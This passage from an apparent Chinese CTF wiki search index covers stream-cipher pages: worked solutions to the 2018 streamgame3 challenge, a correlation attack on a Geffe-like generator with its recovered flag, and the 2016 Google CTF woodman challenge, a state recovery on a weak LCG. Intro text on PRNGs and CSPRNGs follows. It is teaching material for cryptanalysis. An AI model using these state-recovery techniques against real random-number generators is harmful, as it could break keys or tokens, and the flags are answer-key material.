x_3</p>"},{"location":"crypto/streamcipher/fsr/nfsr/#2018-streamgame3","title":"2018 \u5f3a\u7f51\u676f streamgame3","text":"<p>\u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee</p> <pre><code>from flag import flag\nassert flag.startswith(\"flag{\")\nassert flag.endswith(\"}\")\nassert len(flag)==24\n\ndef lfsr(R,mask):\n    output = (R &lt;&lt; 1) &amp; 0xffffff\n    i=(R&amp;mask)&amp;0xffffff\n    lastbit=0\n    while i!=0:\n        lastbit^=(i&amp;1)\n        i=i&gt;&gt;1\n    output^=lastbit\n    return (output,lastbit)\n\n\ndef single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask):\n    (R1_NEW,x1)=lfsr(R1,R1_mask)\n    (R2_NEW,x2)=lfsr(R2,R2_mask)\n    (R3_NEW,x3)=lfsr(R3,R3_mask)\n    return (R1_NEW,R2_NEW,R3_NEW,(x1*x2)^((x2^1)*x3))\n\nR1=int(flag[5:11],16)\nR2=int(flag[11:17],16)\nR3=int(flag[17:23],16)\nassert len(bin(R1)[2:])==17\nassert len(bin(R2)[2:])==19\nassert len(bin(R3)[2:])==21\nR1_mask=0x10020\nR2_mask=0x4100c\nR3_mask=0x100002\n\n\nfor fi in range(1024):\n    print fi\n    tmp1mb=\"\"\n    for i in range(1024):\n        tmp1kb=\"\"\n        for j in range(1024):\n            tmp=0\n            for k in range(8):\n                (R1,R2,R3,out)=single_round(R1,R1_mask,R2,R2_mask,R3,R3_mask)\n                tmp = (tmp &lt;&lt; 1) ^ out\n            tmp1kb+=chr(tmp)\n        tmp1mb+=tmp1kb\n    f = open(\"./output/\" + str(fi), \"ab\")\n    f.write(tmp1mb)\n    f.close()\n</code></pre> <p>\u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u4e0e Geffe \u751f\u6210\u5668\u975e\u5e38\u7c7b\u4f3c\uff0c\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u76f8\u5173\u653b\u51fb\u65b9\u6cd5\u8fdb\u884c\u653b\u51fb\uff0c\u6211\u4eec\u53ef\u4ee5\u7edf\u8ba1\u4e00\u4e0b\u5728\u4e09\u4e2a LFSR \u8f93\u51fa\u4e0d\u540c\u7684\u60c5\u51b5\u4e0b\uff0c\u6700\u540e\u7c7b Geffe \u751f\u6210\u5668\u7684\u8f93\u51fa\uff0c\u5982\u4e0b</p> x_1 x_2 x_3 F(x_1,x_2,x_3) 0 0 0 0 0 0 1 1 0 1 0 0 0 1 1 0 1 0 0 0 1 0 1 1 1 1 0 1 1 1 1 1 <p>\u53ef\u4ee5\u53d1\u73b0</p> <ul> <li>Geffe \u7684\u8f93\u51fa\u4e0e x_1 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75</li> <li>Geffe \u7684\u8f93\u51fa\u4e0e x_2 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.5</li> <li>Geffe \u7684\u8f93\u51fa\u4e0e x_3 \u76f8\u540c\u7684\u6982\u7387\u4e3a 0.75</li> </ul> <p>\u8fd9\u8bf4\u660e\u8f93\u51fa\u4e0e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a\u7684\u5173\u8054\u6027\u975e\u5e38\u5927\u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u53bb\u679a\u4e3e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e09\u4e2a LFSR \u7684\u8f93\u51fa\u5224\u65ad\u5176\u4e0e \u7c7b Geffe \u7684\u8f93\u51fa\u76f8\u7b49\u7684\u4e2a\u6570\uff0c\u5982\u679c\u5927\u7ea6\u5728 75% \u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f\u6b63\u786e\u7684\u3002\u7b2c\u4e8c\u4e2a\u5c31\u76f4\u63a5\u66b4\u529b\u679a\u4e3e\u4e86\u3002</p> <p>\u811a\u672c\u5982\u4e0b</p> <pre><code>#for x1 in range(2):\n#    for x2 in range(2):\n#        for x3 in range(2):\n#            print x1,x2,x3,(x1*x2)^((x2^1)*x3)\n#n = [17,19,21]\n\n#cycle = 1\n#for i in n:\n#    cycle = cycle*(pow(2,i)-1)\n#print cycle\n\n\ndef lfsr(R, mask):\n    output = (R &lt;&lt; 1) &amp; 0xffffff\n    i = (R &amp; mask) &amp; 0xffffff\n    lastbit = 0\n    while i != 0:\n        lastbit ^= (i &amp; 1)\n        i = i &gt;&gt; 1\n    output ^= lastbit\n    return (output, lastbit)\n\n\ndef single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask):\n    (R1_NEW, x1) = lfsr(R1, R1_mask)\n    (R2_NEW, x2) = lfsr(R2, R2_mask)\n    (R3_NEW, x3) = lfsr(R3, R3_mask)\n    return (R1_NEW, R2_NEW, R3_NEW, (x1 * x2) ^ ((x2 ^ 1) * x3))\n\n\nR1_mask = 0x10020\nR2_mask = 0x4100c\nR3_mask = 0x100002\nn3 = 21\nn2 = 19\nn1 = 17\n\n\ndef guess(beg, end, num, mask):\n    ansn = range(beg, end)\n    data = open('./output/0').read(num)\n    data = ''.join(bin(256 + ord(c))[3:] for c in data)\n    now = 0\n    res = 0\n    for i in ansn:\n        r = i\n        cnt = 0\n        for j in range(num * 8):\n            r, lastbit = lfsr(r, mask)\n            lastbit = str(lastbit)\n            cnt += (lastbit == data[j])\n        if cnt &gt; now:\n            now = cnt\n            res = i\n            print now, res\n    return res\n\n\ndef bruteforce2(x, z):\n    data = open('./output/0').read(50)\n    data = ''.join(bin(256 + ord(c))[3:] for c in data)\n    for y in range(pow(2, n2 - 1), pow(2, n2)):\n        R1, R2, R3 = x, y, z\n        flag = True\n        for i in range(len(data)):\n            (R1, R2, R3,\n             out) = single_round(R1, R1_mask, R2, R2_mask, R3, R3_mask)\n            if str(out) != data[i]:\n                flag = False\n                break\n        if y % 10000 == 0:\n            print 'now: ', x, y, z\n        if flag:\n            print 'ans: ', hex(x)[2:], hex(y)[2:], hex(z)[2:]\n            break\n\n\nR1 = guess(pow(2, n1 - 1), pow(2, n1), 40, R1_mask)\nprint R1\nR3 = guess(pow(2, n3 - 1), pow(2, n3), 40, R3_mask)\nprint R3\nR1 = 113099\nR3 = 1487603\n\nbruteforce2(R1, R3)\n</code></pre> <p>\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b</p> <pre><code>\u279c  2018-CISCN-start-streamgame3 git:(master) \u2717 python exp.py\n161 65536\n172 65538\n189 65545\n203 65661\n210 109191\n242 113099\n113099\n157 1048576\n165 1048578\n183 1048580\n184 1049136\n186 1049436\n187 1049964\n189 1050869\n190 1051389\n192 1051836\n194 1053573\n195 1055799\n203 1060961\n205 1195773\n212 1226461\n213 1317459\n219 1481465\n239 1487603\n1487603\nnow:  113099 270000 1487603\nnow:  113099 280000 1487603\nnow:  113099 290000 1487603\nnow:  113099 300000 1487603\nnow:  113099 310000 1487603\nnow:  113099 320000 1487603\nnow:  113099 330000 1487603\nnow:  113099 340000 1487603\nnow:  113099 350000 1487603\nnow:  113099 360000 1487603\nans:  1b9cb 5979c 16b2f3\n</code></pre> <p>\u4ece\u800c flag \u4e3a flag{01b9cb05979c16b2f3}\u3002</p>"},{"location":"crypto/streamcipher/fsr/nfsr/#_5","title":"\u9898\u76ee","text":"<ul> <li>2017 WHCTF Bornpig</li> <li>2018 Google CTF 2018 Betterzip</li> </ul>"},{"location":"crypto/streamcipher/fsr/nfsr/#_6","title":"\u53c2\u8003","text":"<ul> <li>https://www.rocq.inria.fr/secret/Anne.Canteaut/MPRI/chapter3.pdf</li> <li>http://data.at.preempted.net/INDEX/articles/Correlation_Attacks_Geffe.pdf</li> </ul>"},{"location":"crypto/streamcipher/lcg/challenge/","title":"\u9898\u76ee","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/streamcipher/lcg/challenge/#2016-google-ctf-woodman","title":"2016 Google CTF woodman","text":"<p>\u7a0b\u5e8f\u7684\u5927\u6982\u610f\u601d\u5c31\u662f\u4e00\u4e2a\u731c\u6570\u6e38\u620f\uff0c\u5982\u679c\u8fde\u7eed\u731c\u4e2d\u82e5\u5e72\u6b21\uff0c\u5c31\u7b97\u4f1a\u62ff\u5230 flag\uff0c\u80cc\u540e\u7684\u751f\u6210\u76f8\u5e94\u6570\u7684\u6838\u5fc3\u4ee3\u7801\u5982\u4e0b</p> <pre><code>class SecurePrng(object):\n    def __init__(self):\n        # generate seed with 64 bits of entropy\n        self.p = 4646704883L\n        self.x = random.randint(0, self.p)\n        self.y = random.randint(0, self.p)\n\n    def next(self):\n        self.x = (2 * self.x + 3) % self.p\n        self.y = (3 * self.y + 9) % self.p\n        return (self.x ^ self.y)\n</code></pre> <p>\u8fd9\u91cc\u6211\u4eec\u663e\u7136\uff0c\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u8fd8\u662f\u6bd4\u8f83\u5bb9\u6613\u7684\uff0c\u6bd5\u7adf\u6982\u7387\u4e5f\u6709 0.25\u3002\u8fd9\u91cc\u5f53\u6211\u4eec\u731c\u51fa\u524d\u4e24\u8f6e\u540e\uff0c\u4f7f\u7528 Z3 \u6765\u6c42\u89e3\u51fa\u521d\u59cb\u7684 x \u548c y\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u987a\u5229\u7684\u731c\u51fa\u5269\u4e0b\u7684\u503c\u4e86\u3002</p> <p>\u5177\u4f53\u7684\u811a\u672c\u5982\u4e0b\uff0c\u7136\u800c Z3 \u5728\u89e3\u51b3\u8fd9\u6837\u7684\u95ee\u9898\u65f6\u4f3c\u4e4e\u662f\u6709\u95ee\u9898\u7684\u3002\u3002\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u8003\u8651\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\uff0c\u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u679a\u4e3e\u5230\u9ad8\u6bd4\u7279\u4f4d\u83b7\u53d6 x \u7684\u503c\uff0c\u4e4b\u6240\u4ee5\u80fd\u591f\u8fd9\u6837\u505a\uff0c\u662f\u4f9d\u8d56\u4e8e\u8fd9\u6837\u7684\u89c2\u5bdf</p> <ul> <li>a + b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u6536\u5230\u4f4e\u6bd4\u7279\u4f4d\u7684\u8fdb\u4f4d\u6570\u503c\u3002</li> <li>a - b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u7b2c i \u6bd4\u7279\u4f4d\u8fdb\u884c\u8fd0\u7b97\u65f6\uff0c\u53ea\u6709\u53ef\u80fd\u5411\u4f4e\u6bd4\u7279\u4f4d\u7684\u501f\u4f4d\u3002</li> <li>a * b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u4ee5\u89c6\u4f5c\u591a\u6b21\u52a0\u6cd5\u3002</li> <li>a % b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u4ee5\u53ca\u66f4\u4f4e\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u56e0\u4e3a\u8fd9\u53ef\u89c6\u4e3a\u591a\u6b21\u8fdb\u884c\u51cf\u6cd5\u3002</li> <li>a ^ b = c\uff0cc \u7684\u7b2c i \u6bd4\u7279\u4f4d\u7684\u503c\u53ea\u53d7 a \u548c b \u8be5\u6bd4\u7279\u4f4d\u7684\u5f71\u54cd\u3002\u8fd9\u4e00\u70b9\u662f\u663e\u800c\u6613\u89c1\u7684\u3002</li> </ul> <p>\u6ce8\uff1a\u4e2a\u4eba\u611f\u89c9\u8fd9\u4e2a\u6280\u5de7\u975e\u5e38\u6709\u7528\u3002</p> <p>\u6b64\u5916\uff0c\u6211\u4eec\u4e0d\u96be\u5f97\u77e5 p \u7684\u6bd4\u7279\u4f4d\u4e3a 33 \u6bd4\u7279\u4f4d\u3002\u5177\u4f53\u5229\u7528\u601d\u8def\u5982\u4e0b</p> <ol> <li>\u9996\u5148\u83b7\u53d6\u4e24\u6b21\u731c\u5230\u7684\u503c\uff0c\u8fd9\u4e2a\u6982\u7387\u6709 0.25\u3002</li> <li>\u4f9d\u6b21\u4ece\u4f4e\u6bd4\u7279\u4f4d\u5230\u9ad8\u6bd4\u7279\u4f4d\u4f9d\u6b21\u679a\u4e3e\u7b2c\u4e00\u6b21\u8fed\u4ee3\u540e\u7684 x \u7684\u76f8\u5e94\u6bd4\u7279\u4f4d\u3002</li> <li>\u6839\u636e\u81ea\u5df1\u679a\u4e3e\u7684\u503c\u5206\u522b\u8ba1\u7b97\u51fa\u7b2c\u4e8c\u6b21\u7684\u503c\uff0c\u53ea\u6709\u5f53\u5bf9\u5e94\u6bd4\u7279\u4f4d\u6b63\u786e\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u5165\u5019\u9009\u6b63\u786e\u503c\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u7531\u4e8e\u53d6\u6a21\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u679a\u4e3e\u5230\u5e95\u51cf\u4e86\u591a\u5c11\u6b21\u3002</li> <li>\u6b64\u5916\uff0c\u5728\u6700\u7ec8\u5224\u65ad\u65f6\uff0c\u4ecd\u7136\u9700\u8981\u786e\u4fdd\u5bf9\u5e94\u7684\u503c\u6ee1\u8db3\u4e00\u5b9a\u8981\u6c42\uff0c\u56e0\u4e3a\u4e4b\u524d\u5bf9\u51cf\u4e86\u591a\u5c11\u6b21\u8fdb\u884c\u4e86\u679a\u4e3e\u3002</li> </ol> <p>\u5177\u4f53\u5229\u7528\u4ee3\u7801\u5982\u4e0b</p> <pre><code>import os\nimport random\nfrom itertools import product\n\n\nclass SecurePrng(object):\n    def __init__(self, x=-1, y=-1):\n        # generate seed with 64 bits of entropy\n        self.p = 4646704883L  # 33bit\n        if x == -1:\n            self.x = random.randint(0, self.p)\n        else:\n            self.x = x\n        if y == -1:\n            self.y = random.randint(0, self.p)\n        else:\n            self.y = y\n\n    def next(self):\n        self.x = (2 * self.x + 3) % self.p\n        self.y = (3 * self.y + 9) % self.p\n        return (self.x ^ self.y)\n\n\ndef getbiti(num, idx):\n    return bin(num)[-idx - 1:]\n\n\ndef main():\n    sp = SecurePrng()\n    targetx = sp.x\n    targety = sp.y\n    print \"we would like to get x \", targetx\n    print \"we would like to get y \", targety\n\n    # suppose we have already guess two number\n    guess1 = sp.next()\n    guess2 = sp.next()\n\n    p = 4646704883\n\n    # newx = tmpx*2+3-kx*p\n    for kx, ky in product(range(3), range(4)):\n        candidate = [[0]]\n        # only 33 bit\n        for i in range(33):\n            #print 'idx ', i\n            new_candidate = []\n            for old, bit in product(candidate, range(2)):\n                #print old, bit\n                oldx = old[0]\n                #oldy = old[1]\n                tmpx = oldx | ((bit &amp; 1) &lt;&lt; i)\n                #tmpy = oldy | ((bit / 2) &lt;&lt; i)\n                tmpy = tmpx ^ guess1\n                newx = tmpx * 2 + 3 - kx * p + (1 &lt;&lt; 40)\n                newy = tmpy * 3 + 9 - ky * p + (1 &lt;&lt; 40)\n                tmp1 = newx ^ newy\n                #print \"tmpx:    \", bin(tmpx)\n                #print \"targetx: \", bin(targetx)\n                #print \"calculate:     \", bin(tmp1 + (1 &lt;&lt; 40))\n                #print \"target guess2: \", bin(guess1 + (1 &lt;&lt; 40))\n                if getbiti(guess2 + (1 &lt;&lt; 40), i) == getbiti(\n                        tmp1 + (1 &lt;&lt; 40), i):\n                    if [tmpx] not in new_candidate:\n                        #print \"got one\"\n                        #print bin(tmpx)\n                        #print bin(targetx)\n                        #print bin(tmpy)\n                        new_candidate.append([tmpx])\n            candidate = new_candidate\n            #print len(candidate)\n            #print candidate\n        print \"candidate x for kx: \", kx, \" ky \", ky\n        for item in candidate:\n            tmpx = candidate[0][0]\n            tmpy = tmpx ^ guess1\n            if tmpx &gt;= p or tmpx &gt;= p:\n                continue\n            mysp = SecurePrng(tmpx, tmpy)\n            tmp1 = mysp.next()\n            if tmp1 != guess2:\n                continue\n            print tmpx, tmpy\n            print(targetx * 2 + 3) % p, (targety * 3 + 9) % p\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre>"},{"location":"crypto/streamcipher/lcg/intro/","title":"\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5f85\u8865\u5145\u3002</p>"},{"location":"crypto/streamcipher/prng/csprng/","title":"\u5bc6\u7801\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/streamcipher/prng/csprng/#_2","title":"\u4ecb\u7ecd","text":"<p>\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographically secure pseudo-random number generator\uff0cCSPRNG\uff09\uff0c\u4e5f\u79f0\u4e3a\u5bc6\u7801\u5b66\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08cryptographic pseudo-random number generator\uff0cCPRNG\uff09\uff0c\u662f\u4e00\u79cd\u7279\u6b8a\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u5b83\u9700\u8981\u6ee1\u8db3\u6ee1\u8db3\u4e00\u4e9b\u5fc5\u8981\u7684\u7279\u6027\uff0c\u4ee5\u4fbf\u4e8e\u9002\u5408\u4e8e\u5bc6\u7801\u5b66\u5e94\u7528\u3002</p> <p>\u5bc6\u7801\u5b66\u7684\u5f88\u591a\u65b9\u9762\u90fd\u9700\u8981\u968f\u673a\u6570</p> <ul> <li>\u5bc6\u94a5\u751f\u6210</li> <li>\u751f\u6210\u521d\u59cb\u5316\u5411\u91cf\uff0cIV\uff0c\u7528\u4e8e\u5206\u7ec4\u5bc6\u7801\u7684 CBC\uff0cCFB\uff0cOFB \u6a21\u5f0f</li> <li>nounce\uff0c\u7528\u4e8e\u9632\u6b62\u91cd\u653e\u653b\u51fb\u4ee5\u53ca\u5206\u7ec4\u5bc6\u7801\u7684 CTR \u6a21\u5f0f\u7b49\u3001</li> <li>one-time pads</li> <li>\u67d0\u4e9b\u7b7e\u540d\u65b9\u6848\u4e2d\u7684\u76d0\uff0c\u5982 ECDSA\uff0c RSASSA-PSS</li> </ul>"},{"location":"crypto/streamcipher/prng/csprng/#_3","title":"\u9700\u6c42","text":"<p>\u6beb\u65e0\u7591\u95ee\uff0c\u5bc6\u7801\u5b66\u5b89\u5168\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u8981\u6c42\u80af\u5b9a\u6bd4\u4e00\u822c\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u8981\u9ad8\u3002\u4e00\u822c\u800c\u8a00\uff0cCSPRNG \u7684\u8981\u6c42\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b</p> <ul> <li>\u901a\u8fc7\u7edf\u8ba1\u968f\u673a\u6027\u6d4b\u8bd5\u3002CSPRNG \u5fc5\u987b\u901a\u8fc7 next-bit test\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u77e5\u9053\u4e86\u4e00\u4e2a\u5e8f\u5217\u7684\u524d k \u4e2a\u6bd4\u7279\uff0c\u653b\u51fb\u8005\u4e0d\u53ef\u80fd\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u4ee5\u5927\u4e8e 50% \u7684\u6982\u7387\u9884\u6d4b\u51fa\u6765\u4e0b\u4e00\u4e2a\u6bd4\u7279\u4f4d\u3002\u8fd9\u91cc\u7279\u522b\u63d0\u53ca\u4e00\u70b9\uff0c\u59da\u671f\u667a\u66fe\u5728 1982 \u5e74\u8bc1\u660e\uff0c\u5982\u679c\u4e00\u4e2a\u751f\u6210\u5668\u53ef\u4ee5\u901a\u8fc7  next-bit test\uff0c\u90a3\u4e48\u5b83\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6240\u6709\u5176\u4ed6\u7684\u591a\u9879\u5f0f\u65f6\u95f4\u7edf\u8ba1\u6d4b\u8bd5\u3002</li> <li>\u5fc5\u987b\u80fd\u591f\u62b5\u6297\u8db3\u591f\u5f3a\u7684\u653b\u51fb\uff0c\u6bd4\u5982\u5f53\u751f\u6210\u5668\u7684\u90e8\u5206\u521d\u59cb\u72b6\u6001\u6216\u8005\u8fd0\u884c\u65f6\u7684\u72b6\u6001\u88ab\u653b\u51fb\u8005\u83b7\u77e5\u65f6\uff0c\u653b\u51fb\u8005\u4ecd\u7136\u4e0d\u80fd\u591f\u83b7\u53d6\u6cc4\u6f0f\u72b6\u6001\u4e4b\u524d\u7684\u751f\u6210\u7684\u968f\u673a\u6570\u3002</li> </ul>"},{"location":"crypto/streamcipher/prng/csprng/#_4","title":"\u5206\u7c7b","text":"<p>\u5c31\u76ee\u524d\u800c\u770b\uff0c CSPRNG \u7684\u8bbe\u8ba1\u53ef\u4ee5\u5206\u4e3a\u4ee5\u4e0b\u4e09\u7c7b</p> <ul> <li>\u57fa\u4e8e\u5bc6\u7801\u5b66\u7b97\u6cd5\uff0c\u5982\u5bc6\u6587\u6216\u8005\u54c8\u5e0c\u503c\u3002</li> <li>\u57fa\u4e8e\u6570\u5b66\u96be\u9898</li> <li>\u67d0\u4e9b\u7279\u6b8a\u76ee\u7684\u7684\u8bbe\u8ba1</li> </ul>"},{"location":"crypto/streamcipher/prng/csprng/#_5","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</li> </ul>"},{"location":"crypto/streamcipher/prng/intro/","title":"\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4ecb\u7ecd","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/streamcipher/prng/intro/#_2","title":"\u6982\u8ff0","text":"<p>\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\uff08pseudorandom number generator\uff0cPRNG\uff09\uff0c\u53c8\u79f0\u4e3a\u786e\u5b9a\u6027\u968f\u673a\u4f4d\u751f\u6210\u5668\uff08deterministic random bit generator\uff0cDRBG\uff09\uff0c\u662f\u7528\u6765\u751f\u6210\u63a5\u8fd1\u4e8e\u7edd\u5bf9\u968f\u673a\u6570\u5e8f\u5217\u7684\u6570\u5b57\u5e8f\u5217\u7684\u7b97\u6cd5\u3002\u4e00\u822c\u6765\u8bf4\uff0cPRNG \u4f1a\u4f9d\u8d56\u4e8e\u4e00\u4e2a\u521d\u59cb\u503c\uff0c\u4e5f\u79f0\u4e3a\u79cd\u5b50\uff0c\u6765\u751f\u6210\u5bf9\u5e94\u7684\u4f2a\u968f\u673a\u6570\u5e8f\u5217\u3002\u53ea\u8981\u79cd\u5b50\u786e\u5b9a\u4e86\uff0cPRNG \u6240\u751f\u6210\u7684\u968f\u673a\u6570\u5c31\u662f\u5b8c\u5168\u786e\u5b9a\u7684\uff0c\u56e0\u6b64\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u5e76\u4e0d\u662f\u771f\u6b63\u968f\u673a\u7684\u3002</p> <p>\u5c31\u76ee\u524d\u800c\u8a00\uff0cPRNG \u5728\u4f17\u591a\u5e94\u7528\u90fd\u53d1\u6325\u7740\u91cd\u8981\u7684\u4f5c\u7528\uff0c\u6bd4\u5982\u6a21\u62df\uff08\u8499\u7279\u5361\u6d1b\u65b9\u6cd5\uff09\uff0c\u7535\u5b50\u7ade\u6280\uff0c\u5bc6\u7801\u5e94\u7528\u3002</p>"},{"location":"crypto/streamcipher/prng/intro/#_3","title":"\u968f\u673a\u6027\u7684\u4e25\u683c\u6027","text":"<ul> <li>\u968f\u673a\u6027\uff1a\u968f\u673a\u6570\u5e94\u8be5\u4e0d\u5b58\u5728\u7edf\u8ba1\u5b66\u504f\u5dee\uff0c\u662f\u5b8c\u5168\u6742\u4e71\u7684\u6570\u5217\u3002</li> <li>\u4e0d\u53ef\u9884\u6d4b\u6027\uff1a\u4e0d\u80fd\u4ece\u8fc7\u53bb\u7684\u5e8f\u5217\u63a8\u6d4b\u51fa\u4e0b\u4e00\u4e2a\u51fa\u73b0\u7684\u6570\u3002</li> <li>\u4e0d\u53ef\u91cd\u73b0\u6027\uff1a\u9664\u975e\u6570\u5217\u4fdd\u5b58\u4e0b\u6765\uff0c\u5426\u5219\u4e0d\u80fd\u91cd\u73b0\u76f8\u540c\u7684\u6570\u5217\u3002</li> </ul> <p>\u8fd9\u4e09\u4e2a\u6027\u8d28\u7684\u4e25\u683c\u6027\u4f9d\u6b21\u9012\u589e\u3002</p> <p>\u4e00\u822c\u6765\u8bf4\uff0c\u968f\u673a\u6570\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b</p> \u7c7b\u522b \u968f\u673a\u6027 \u4e0d\u53ef\u9884\u6d4b\u6027 \u4e0d\u53ef\u91cd\u73b0\u6027 \u5f31\u4f2a\u968f\u673a\u6570 \u2705 \u274c \u274c \u5f3a\u4f2a\u968f\u673a\u6570 \u2705 \u2705 \u274c \u771f\u968f\u673a\u6570 \u2705 \u2705 \u2705 <p>\u4e00\u822c\u6765\u8bf4\uff0c\u5bc6\u7801\u5b66\u4e2d\u4f7f\u7528\u7684\u968f\u673a\u6570\u662f\u7b2c\u4e8c\u79cd\u3002</p>"},{"location":"crypto/streamcipher/prng/intro/#_4","title":"\u5468\u671f","text":"<p>\u6b63\u5982\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\uff0c\u4e00\u65e6 PRNG \u6240\u4f9d\u8d56\u7684\u79cd\u5b50\u786e\u5b9a\u4e86\uff0c\u90a3\u4e48 PRNG \u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u57fa\u672c\u4e5f\u5c31\u786e\u5b9a\u4e86\u3002\u8fd9\u91cc\u5b9a\u4e49 PRNG \u7684\u5468\u671f\u5982\u4e0b\uff1a\u5bf9\u4e8e\u4e00\u4e2a PRNG \u7684\u6240\u6709\u53ef\u80fd\u8d77\u59cb\u72b6\u6001\uff0c\u4e0d\u91cd\u590d\u5e8f\u5217\u7684\u6700\u957f\u957f\u5ea6\u3002\u663e\u7136\uff0c\u5bf9\u4e8e\u4e00\u4e2a PRNG \u6765\u8bf4\uff0c\u5176\u5468\u671f\u4e0d\u4f1a\u5927\u4e8e\u5176\u6240\u6709\u53ef\u80fd\u7684\u72b6\u6001\u3002\u4f46\u662f\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5e76\u4e0d\u662f\u5f53\u6211\u4eec\u9047\u5230\u91cd\u590d\u7684\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u8ba4\u4e3a\u662f PRNG \u7684\u5468\u671f\uff0c\u56e0\u4e3a PRNG \u7684\u72b6\u6001\u4e00\u822c\u90fd\u662f\u5927\u4e8e\u8f93\u51fa\u7684\u4f4d\u6570\u7684\u3002</p>"},{"location":"crypto/streamcipher/prng/intro/#_5","title":"\u8bc4\u4ef7\u6807\u51c6","text":"<p>\u53c2\u89c1\u7ef4\u57fa\u767e\u79d1\uff0chttps://en.wikipedia.org/wiki/Pseudorandom_number_generator\u3002</p>"},{"location":"crypto/streamcipher/prng/intro/#_6","title":"\u5206\u7c7b","text":"<p>\u76ee\u524d\u901a\u7528\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u4e3b\u8981\u6709</p> <ul> <li>\u7ebf\u6027\u540c\u4f59\u751f\u6210\u5668\uff0cLCG</li> <li>\u7ebf\u6027\u56de\u5f52\u53d1\u751f\u5668</li> <li>Mersenne Twister</li> <li>xorshift generators</li> <li>WELL family of generators</li> <li>Linear feedback shift register\uff0cLFSR\uff0c\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668</li> </ul>"},{"location":"crypto/streamcipher/prng/intro/#_7","title":"\u95ee\u9898","text":"<p>\u901a\u5e38\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u53ef\u80fd\u4f1a\u6709\u4ee5\u4e0b\u95ee\u9898</p> <ul> <li>\u5728\u67d0\u4e9b\u79cd\u5b50\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u751f\u6210\u7684\u968f\u673a\u6570\u5e8f\u5217\u7684\u5468\u671f\u4f1a\u6bd4\u8f83\u5c0f\u3002</li> 